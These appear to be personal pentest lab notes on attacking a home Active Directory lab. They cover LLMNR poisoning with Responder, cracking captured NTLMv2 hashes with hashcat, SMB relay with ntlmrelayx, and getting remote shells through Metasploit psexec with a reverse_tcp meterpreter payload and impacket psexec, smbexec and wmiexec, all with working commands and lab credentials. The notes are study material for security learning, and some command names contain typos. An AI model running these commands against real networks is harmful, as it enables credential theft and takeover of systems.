### Prepare AD

```
setspn -a DC01/SQLService.mo.local:60111 mo\SQLService

```

This command registers a Service Principal Name (SPN) to a specific user account in Active Directory.
In simple terms, it tells your network's domain controller: "Whenever a computer or user tries to securely connect to the service at DC01/SQLService.mo.local:60111, they need to authenticate using the mo\SQLService service account."
![alt text](../../Screenshoots/msf.png)

```
setspn -T mo.local -Q */*

```

![alt text](../Screenshots/metasploit-psexec-shell.png)

Internal Pentest lab
Configure an Active Directory (AD) Group Policy Object (GPO) to turn off Microsoft Defender

On User Computers
-Add folder called Share under
-Login as mo\administrator, make user admin of computer

## Attacking Active Directory: Initial Attack Vectors

https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

### LLMNR Poisoning

LLMNR is used to identify hosts when DNS fails to do so
Step 1 Run Responder - python Responder.py -I tun0 -rdw -v

- python Responder.py -I tun0 -rdw -v

What your current flags mean:
-I eth0: Specifies the network interface (eth0). (Note: Ensure you use a capital -I, as lowercase -i is typically reserved for IP redirection or macOS specific routing).
-d: Enables DHCP rogue server responses.
-w: Starts the WPAD rogue proxy server.
-v: Enables verbose mode to display detailed log outputs.

Step 2 An Event Occurs...

- point to machine with responder listening, can't acccess machine DNS fails ,responder kicks in ,responds to message
- User does something like wrong...
  ![alt text](../Screenshots/llmnr-event.png)

Step 3 Get Dem Hashes

- Hashes show up on our responder
  ![alt text](../Screenshots/hash-captured.png)
- copy into a textfile name it ntlmhash.txt

Step 4 Crack Dem Hashes hashcat -m 5600 hashes.txt rockyou.txt

- hashcat -m 5600 ntlmhash.txt.txt rockyou.txt
- crack password with hashcat
  ![alt text](../Screenshots/hashcat-cracking-ntlmhash.png)

### SMB RELAY

Have AD with

- server machine
- 2+ local workstations machines, 10.0.0.50 ,10.0.0.70
  A standard Active Directory (AD) relay attack typically requires two target machines: one to trigger the authentication (the victim) and another to receive the relayed credentials (the target).

Discovering Hosts with SMB Signing Disabled

> Message signing is disabled by default on any workstations and enabled and required on every server by default

- using nmap

Step 1: Configure Responder

- gedit Responder.conf
  turn SMB = Off
  HTTP = off

Step 2: Run Responder

Responder.py -I eth0

- Execution MethodRuns the standalone script directly from a cloned directory or repository .
  vresponder -I eth0
- Runs a globally installed package (usually pre-installed on Kali Linux or installed via apt).

- python Responder.py -I tun0 -rdw
  ![alt text](../../Screenshoots/responder.png)

RUN - responder -I eth0 -dwv

Step 3: Setup your relay

- python ntmlrelayx.py -tf targets.txt -smb2support

RUN - ntmlrelayx.py -tf targets.txt -smb2support

Step 4: An Event occurs

- point to machine with responder listening, can't acccess machine DNS fails ,responder kicks in ,instead of responding to message ,it relays credentials captured into other machine
  Received credentials from 10.0.0.50 ,attack target inside network 10.0.0.70 with credentials
  Received credentials from 10.0.0.50 ,these credentials must be from an admin of this machine

Step 5: Win
Received credentials from 10.0.0.50 ,attack target 10.0.0.70 with credentials, if success

### Gaining Shell

#### Metasploit

Launch Metasploit: msfconsole
Search for the module: use exploit/windows/smb/psexec
Configure the target and your credentials:

msfconsole

search psexec  
24 exploit/windows/smb/psexec
use 24

msf exploit(windows/smb/psexec) > set rhosts 10.0.0.50
rhosts => 10.0.0.50  
msf exploit(windows/smb/psexec) > set smbdomain mo.local
smbdomain => mo.local  
msf exploit(windows/smb/psexec) > set smbpass Password1!!
smbpass => Password1!!
msf exploit(windows/smb/psexec) > set smbuser k.lamar
smbuser => k.lamar
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

#### Impacket

impacket-psexec and psexec.py are actually the exact same tool, just called by different names depending on how you choose to run it in Kali Linux.

1. Using Impacket (impacket-psexec)
   Kali Linux includes an alias for Impacket’s psexec.py script. Like the Windows version, it connects via SMB (port 445), uploads a random binary to the ADMIN$ share, registers it as a Windows service, and drops you into a remote NT AUTHORITY\SYSTEM shell.

impacket-psexec DOMAIN/Username:'Password'@TARGET_IP

impacket-psexec mo/k.lamar:'Password1!!'@10.0.0.50
impacket-smbexec mo/k.lamar:Password1\!\!@10.0.0.50
impacket-wmiexec mo/k.lamar:Password1\!\!@10.0.0.50

### IPv6 Attacks
